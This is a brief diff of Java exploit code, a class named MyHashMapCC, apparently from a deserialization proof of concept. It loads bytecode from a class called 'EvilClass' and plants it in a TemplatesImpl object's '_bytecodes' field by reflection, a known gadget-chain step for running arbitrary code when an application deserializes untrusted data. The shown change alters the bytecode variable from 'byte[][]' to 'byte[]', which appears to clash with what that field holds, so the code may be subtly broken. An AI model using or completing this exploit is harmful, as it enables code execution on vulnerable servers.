@@ -25,7 +25,7 @@ import java.util.Map;
 
 public class MyHashMapCC {
     public static void main(String[] args) throws Exception{
-        byte[][] bytes = Util.getExpClassFileBytes("EvilClass");
+        byte[] bytes = Util.getExpClassFileBytes("EvilClass");
         TemplatesImpl templates = new TemplatesImpl();
         Util.setValue(templates, "_name", "v");
         Util.setValue(templates, "_bytecodes", bytes);
